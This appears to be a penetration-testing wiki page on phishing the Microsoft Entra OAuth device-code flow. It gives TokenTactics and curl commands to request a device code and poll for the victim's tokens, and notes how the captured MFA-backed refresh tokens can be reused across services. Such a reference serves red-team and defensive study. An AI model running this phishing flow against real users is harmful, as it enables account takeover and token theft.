---
title: "Device code phishing: capturing tokens through the device-code flow"
description: "Phishing the Entra OAuth device-code flow: delivering a user code to capture a victim's access and refresh tokens with TokenTactics."
keywords:
  - device code phishing
  - OAuth
  - TokenTactics
  - refresh token
  - device code flow
---

# Device code phishing

The OAuth **device-code flow** is designed for input-constrained devices: a client requests a code, the user enters it at `microsoft.com/devicelogin` and authenticates, and the client polls for the resulting tokens. Phished, it is potent: you start the flow, send the victim the short user code in a believable message, and when they complete sign-in (MFA included) you receive their **access and refresh tokens**.

## Run the flow

```powershell
# TokenTactics: request a device code, then poll for tokens after the victim authenticates
Get-AzureToken -Client MSGraph
# prints a user_code to send to the victim; after they sign in, tokens land here
```

```bash
# raw: request the device code
curl -s https://login.microsoftonline.com/common/oauth2/v2.0/devicecode \
  -d "client_id=<client>&scope=https://graph.microsoft.com/.default offline_access"
# poll the token endpoint with grant_type=urn:ietf:params:oauth:grant-type:device_code
```

## Exploitation notes

- The victim completes real MFA, so the resulting tokens are fully authenticated; the refresh token then yields tokens for other first-party scopes.
- The message works because the domain (`microsoft.com/devicelogin`) is legitimate, which defeats URL inspection.
- Refresh tokens from a public first-party client can often be exchanged across resources (Graph, Azure management, etc.).

## Tools

- **TokenTactics** (`Get-AzureToken`): device-code request and token capture.
- **TeamFiltration**: device-code phishing module.

## References

- [TokenTactics (rvrsh3ll)](https://github.com/rvrsh3ll/TokenTactics)
- [dirkjanm.io: device code research](https://dirkjanm.io/)
- [HackTricks Cloud: device code phishing](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
